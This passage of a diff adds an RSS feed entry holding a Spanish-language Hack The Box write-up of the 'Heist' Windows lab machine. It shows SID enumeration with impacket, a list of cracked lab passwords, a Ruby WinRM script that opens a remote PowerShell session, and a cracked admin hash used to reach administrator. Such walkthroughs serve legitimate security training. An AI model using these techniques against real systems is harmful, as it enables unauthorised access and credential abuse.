+&lt;/ul&gt;
+&lt;p&gt;Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.47.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149
+Impacket v0.9.20-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Brute forcing SIDs at 10.10.10.149
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; StringBinding ncacn_np:10.10.10.149&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;ipe&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;sarpc&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+501: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+503: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;efaultAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+504: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;DAGUtilityAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+513: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;one &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeGroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1008: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;azard &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1009: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;upport &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1012: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;hase &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1013: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;ason &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h5 id=&#34;credenciales&#34;&gt;CREDENCIALES&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;hazard:stealth1agent
+rout3r:$uperP@ssword
+admin:Q4)sJu\Y8qz*A3?d
+chase:Q4)sJu\Y8qz*A3?d
+jason:
+support:
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;winrm&#34;&gt;WINRM&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://alionder.net/winrm-shell/&#34;&gt;&lt;strong&gt;WinRm&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.&lt;/p&gt;
+&lt;p&gt;Utilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;WinRM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+  &lt;span class=&#34;ss&#34;&gt;endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.10.149:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+  &lt;span class=&#34;ss&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;chase&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+  &lt;span class=&#34;ss&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Q4)sJu\Y8qz*A3?d&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
+        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PS &amp;gt; &amp;#34;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;gets&lt;/span&gt;        
+        &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
+            &lt;span class=&#34;no&#34;&gt;STDOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;
+            &lt;span class=&#34;no&#34;&gt;STDERR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;    
+    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exiting with code &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exitcode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.00.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo &lt;code&gt;login.php&lt;/code&gt; hay una condicion con dos usuarios que pueden logearse: &lt;code&gt;guest y admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;login.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin@support.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sha256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: errorpage.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://md5decrypt.net/en/Sha256/#answer&#34;&gt;&lt;strong&gt;md5decrypt&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
+admin@support.htb:4dD!5}x/re8]FBuZ
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.10.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.11.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Confirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.14.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos una shell y nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>smbmap</category>
+            
+          
+            
+              <category>impacket</category>
+            
+          
+            
+              <category>winrm</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>windows</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
